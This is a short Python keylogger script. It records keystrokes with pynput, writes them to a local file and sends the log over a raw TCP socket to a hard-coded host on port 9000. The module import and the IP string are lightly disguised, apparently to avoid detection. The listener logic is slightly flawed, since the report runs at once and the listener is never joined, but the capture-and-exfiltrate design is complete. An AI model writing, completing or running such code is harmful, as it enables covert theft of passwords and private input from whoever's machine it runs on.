import importlib
keyboard = importlib.import_module('pynput.keyboard')
import socket
import threading

class Keylogger:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.log += current_key
        print(f"Key pressed: {current_key}")

    def report(self):
        with open("keystrokes.dat", "w") as file:
            file.write(self.log)
        self.send_data()
        self.log = ""

    def send_data(self):
        try:
            ip, port = '192.168.122.182'.encode('utf-8'), 9000
            decoded_ip = ip.decode('utf-8')
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((decoded_ip, port))
            sock.sendall(self.log.encode())
            sock.close()
            print("Data sent successfully")
        except Exception as e:
            print(f"Failed to send data: {e}")

    def start(self):
        keyboard_listener = keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()